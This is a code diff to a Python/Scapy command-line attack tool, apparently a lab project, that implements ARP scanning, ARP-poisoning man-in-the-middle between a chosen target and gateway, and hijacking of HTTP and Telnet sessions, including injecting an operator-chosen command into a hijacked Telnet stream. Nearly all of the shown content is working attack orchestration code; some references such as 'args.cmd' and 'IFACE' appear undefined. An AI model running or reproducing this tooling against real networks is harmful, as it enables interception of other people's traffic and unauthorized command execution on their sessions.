@@ -1,6 +1,11 @@
 import os
-from typing import ValuesView
 from scapy.all import *
+from sys import exit
+
+from arp_poisoning import *
+from tcp_hijacking import *
+import globals
+
 
 ASCII_ART = """
  ____    __                                 __         
@@ -14,11 +19,12 @@ ASCII_ART = """
                         \/___/       
 """
 
+
 class Attack:
     def __init__(self, iface):
         self.iface = iface
-        self.ip = get_if_addr(args.interface)
-        self.mac = get_if_hwaddr(args.interface)
+        self.ip = get_if_addr(self.iface)
+        self.mac = get_if_hwaddr(self.iface)
 
 
 class ArpScan(Attack):
@@ -27,7 +33,13 @@ class ArpScan(Attack):
         super().__init__(iface)
 
     def __call__(self):
-        pass
+        print(f"[+] Scanning {self.rhosts}...")
+        result = arp_scan(self.rhosts, self.iface)
+        ip_to_MAC = {}
+
+        for mapping in result:
+            print(f"\t{mapping['IP']} => {mapping['MAC']}")
+            ip_to_MAC[mapping['IP']] = mapping['MAC']
 
     @staticmethod
     def get_params():
@@ -35,13 +47,40 @@ class ArpScan(Attack):
 
 
 class ArpPoisoning(Attack):
+
     def __init__(self, target, gateway, iface):
         self.target = target
         self.gateway = gateway
         super().__init__(iface)
 
     def __call__(self):
-        pass
+        
+        print(f"[+] Determining target and gateway MAC address.")
+
+        result = arp_scan(self.target, self.iface)
+        if not result:
+            print("\tCannot determine target MAC address. Are you sure the IP is correct?")
+            exit(1)
+        else:
+            targetMAC = result[0]['MAC']
+
+        result = arp_scan(self.gateway, self.iface)
+        if not result:
+            print("\tCannot determine gateway MAC address. Are you sure the IP is correct?")
+            exit(1)
+        else:
+            gatewayMAC = result[0]['MAC']
+
+        # Define packet forwarding source and destination
+        globals.GATEWAY_MAC = gatewayMAC
+        globals._SRC_DST = {
+            gatewayMAC: targetMAC,
+            targetMAC: gatewayMAC,
+        }
+
+        print(f"[+] Performing ARP poisoning MITM.")
+        filter = f"ip and (ether src {targetMAC} or ether src {gatewayMAC})"
+        arp_mitm(self.target, self.gateway, targetMAC, gatewayMAC, globals.MY_MAC, sniff_parser, filter, self.iface)
 
     @staticmethod
     def get_params():
@@ -49,17 +88,53 @@ class ArpPoisoning(Attack):
 
 
 class SessionHijacking(Attack):
-    def __init__(self, target, gateway, iface):
+    def __init__(self, target, gateway, proto, iface):
         self.target = target
         self.gateway = gateway
+        self.proto = proto
         super().__init__(iface)
 
     def __call__(self):
-        pass
+
+        print(f"[+] Determining target and gateway MAC address.")
+
+        result = arp_scan(self.target, self.iface)
+        if not result:
+            print("\tCannot determine target MAC address. Are you sure the IP is correct?")
+            exit(1)
+        else:
+            targetMAC = result[0]['MAC']
+
+        result = arp_scan(self.gateway, self.iface)
+        if not result:
+            print("\tCannot determine gateway MAC address. Are you sure the IP is correct?")
+            exit(1)
+        else:
+            gatewayMAC = result[0]['MAC']
+
+        # Define packet forwarding source and destination
+        globals.GATEWAY_MAC = gatewayMAC
+        globals._SRC_DST = {
+            gatewayMAC: targetMAC,
+            targetMAC: gatewayMAC,
+        }
+
+        print(f"[+] Performing ARP poisoning MITM.")
+
+        if self.proto == 'http':
+            globals.PROTO = 'http'
+            filter = f"ip and tcp port 80 and ether src {targetMAC}"
+
+        elif self.proto == 'telnet':
+            globals.PROTO = 'telnet'
+            globals.CMD = args.cmd
+            filter = f"ip and tcp port 23 and ether src {gatewayMAC}"
+
+        arp_mitm(self.target, self.gateway, targetMAC, gatewayMAC, globals.MY_MAC, hijack, filter, self.iface)
 
     @staticmethod
     def get_params():
-        return {'TARGET': '', 'GATEWAY': ''}
+        return {'TARGET': '', 'GATEWAY': '', 'PROTO': ''}
 
 
 class CommandHandler:
@@ -85,6 +160,10 @@ class CommandHandler:
             if key.lower() == 'iface':
                 self.iface = value
                 print(f"IFACE => {value}")
+
+                globals.IFACE = self.iface
+                globals.MY_MAC = get_if_hwaddr(IFACE)
+                globals.MY_IP = get_if_addr(IFACE)
 
             elif key.lower() == 'attack':
                 attack = value.lower()
@@ -142,8 +221,14 @@ class CommandHandler:
                 attack = SessionHijacking(
                     self.attack_params['TARGET'],
                     self.attack_params['GATEWAY'],
+                    self.attack_params['PROTO'],
                     self.iface
                 )
+
+            try:
+                attack()
+            except KeyboardInterrupt:
+                print("Detected keyboard interrupt, ending attack.")
 
         elif cmd == 'QUIT':
             return True
@@ -155,6 +240,11 @@ class CommandHandler:
         return False
 
 def main():
+
+    globals.IFACE = conf.iface
+    globals.MY_MAC = get_if_hwaddr(conf.iface)
+    globals.MY_IP = get_if_addr(conf.iface)
+
     print(ASCII_ART)
     print("{:^55}".format("TCP SESSION HIJACKING"))
     print("{:^55}".format("Attacking and Defending HTTP and Telnet Sessions"))
@@ -165,9 +255,13 @@ def main():
     while True:
         try:
             cmd_handler.parse_cmd(input('> '))
+
         except KeyboardInterrupt:
             print("Bye!")
             break
+
+        except ValueError as e:
+            print(e)
 
 if __name__ == '__main__':
     main()
